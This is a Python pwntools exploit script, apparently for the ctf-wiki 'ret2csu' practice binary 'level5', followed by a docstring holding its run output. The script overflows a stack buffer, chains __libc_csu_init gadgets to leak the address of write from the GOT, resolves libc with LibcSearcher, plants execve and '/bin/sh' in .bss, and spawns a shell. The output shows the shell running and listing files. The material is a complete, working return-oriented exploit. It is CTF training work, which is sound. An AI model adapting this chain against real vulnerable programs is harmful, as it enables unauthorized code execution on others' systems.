from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'
context(arch = "amd64")

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = b'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()


"""
└─# python exp.py
[*] '/root/ctf-practice/ctfwiki/ret2csu/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './level5': pid 219789
/root/ctf-practice/ctfwiki/ret2csu/exp.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sh.recvuntil('Hello, World\n')
[+] There are multiple libc that meet current constraints :
0 - libc6_2.7-10ubuntu3_i386
1 - libc-2.28-206.el8.x86_64
2 - glibc-2.28-206.el8.x86_64
3 - glibc-2.28-208.el8.x86_64
4 - libc-2.28-208.el8.x86_64
5 - glibc-2.28-207.el8.x86_64
6 - libc-2.36-22.mga9.i586
7 - libc6_2.37-6_amd64
8 - libc-2.28-207.el8.x86_64
9 - libc6_2.7-10ubuntu2_i386
[+] Choose one : 7
[+] execve_addr 0x7fb841531060
/root/ctf-practice/ctfwiki/ret2csu/exp.py:51: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sh.recvuntil('Hello, World\n')
/root/ctf-practice/ctfwiki/ret2csu/exp.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sh.recvuntil('Hello, World\n')
[*] Switching to interactive mode
$ ls
core  exp-self.py  exp.py  exp2-test.py  exp3-test.py  level5
$  
"""
